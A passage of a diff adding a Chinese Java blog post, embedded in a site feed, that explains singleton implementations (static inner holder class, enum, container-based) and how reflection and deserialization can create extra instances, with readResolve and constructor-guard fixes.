+<h3 id="通过静态内部类实现："><a href="#通过静态内部类实现：" class="headerlink" title="通过静态内部类实现："></a>通过静态内部类实现：</h3><p>double-check 方法需要加锁，对程序性能有一定影响，用静态内部类实现更好</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhouxinghang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-05-16</span></span><br><span class="line"><span class="comment"> * 外部类初次加载，会初始化静态变量、静态代码块、静态方法，但不会加载内部类和静态内部类。</span></span><br><span class="line"><span class="comment"> * 实例化外部类，调用外部类的静态方法、静态变量，则外部类必须先进行加载，但只加载一次。</span></span><br><span class="line"><span class="comment"> * 直接调用静态内部类时，外部类不会加载。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="单例模式的破坏"><a href="#单例模式的破坏" class="headerlink" title="单例模式的破坏"></a>单例模式的破坏</h2><h3 id="反射破坏单例模式"><a href="#反射破坏单例模式" class="headerlink" title="反射破坏单例模式"></a>反射破坏单例模式</h3><p>尽管构造方法加了 private 修饰，但是可以通过反射调用构造方法，因此对构造方法加以限制，重复创建直接抛出异常。</p>
+<p>以上述 LazySingleton 为例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="序列化破坏单例模式"><a href="#序列化破坏单例模式" class="headerlink" title="序列化破坏单例模式"></a>序列化破坏单例模式</h3><p>在序列化操作时，反序列化后的对象会重新分配内存空间，即重新创建，如果目标是单例对象，就会破坏单例模式。</p>
+<p>对此，我们只需要增加 readResolve() 方法即可。以上述 LazySingleton 为例，修改如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证反序列化还是原对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么，需要看 JDK 序列化源码。ObjectInputStream 类的 readObject() -&gt; readObject0() -&gt; readOrdinaryObject() -&gt; invokeReadResolve()。invokeReadResolve 代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/71BF431A-33F0-4C49-A683-69AF7B27BDFE.png" alt="invokeReadResolve"></p>
+<p>而 readResolveMethod 是在在私有方法 ObjectStreamClass() 中赋值的，代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/2143B7C0-E237-45EB-8D0D-FA667EC34717.png" alt="readResolveMethod"></p>
+<p>可见的，如果被序列化的类定义了 readResolve() 方法，就会调用该方法实现反序列化。</p>
+<p>增加 readResolve() 方法可以防止单例模式被破坏，但是在 readOrdinaryObject() 方法中还是会创建一个新对象的，只不过返回的是readResolve() 方法返回值。具体代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/351EE59B-F579-4B54-BE81-50C017D19F31.png" alt="创建一个新对象"></p>
+<p>注册式单例可以避免这个问题</p>
+<h2 id="注册式单例"><a href="#注册式单例" class="headerlink" title="注册式单例"></a>注册式单例</h2><p>注册式单例又称为登记式单例，就是将每一个实例都登记到某一个地方，使用唯一的标 识获取实例。注册式单例有两种写法：一种为容器缓存，一种为枚举登记。枚举单例也是《Effective Java》书中推荐的一种单例实现写法</p>
+<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span>  <span class="title">EnumSingleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Object date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EnumSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过反编译发现枚举类是通过静态代码块实现的饿汉式单例模式，反编译代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">    INSTANCE = <span class="keyword">new</span> EnumSingleton(<span class="string">&quot;INSTANCE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    $VALUES = (<span class="keyword">new</span> EnumSingleton[] &#123;</span><br><span class="line">        INSTANCE</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>枚举缓存既不会被序列化破坏，也不会被反射破坏。</p>
+<p>对于序列化，在 ObjectInputStream 类中 readEnum() 方法里，发现枚举类型是通过类名和 Class 对象类找到唯一的枚举对象，代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/11AC67F5-4A3E-427F-A758-9C7AA9A20444.png" alt="readEnum"></p>
+<p>对于反射，Constructor 类中的 newInstance() 方法对于枚举类，直接抛出异常：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/9286BD38-C4BA-468A-A523-B6EAD2569951.png" alt="newInstance"></p>
+<h3 id="容器缓存单例"><a href="#容器缓存单例" class="headerlink" title="容器缓存单例"></a>容器缓存单例</h3><p>可以看看 Spring 容器式单例实现：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/31EC471D-8239-49AC-88B9-BA5C538D97D7.png" alt="Spring容器"></p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>源码</tag>
+        <tag>设计模式</tag>
       </tags>
   </entry>
   <entry>
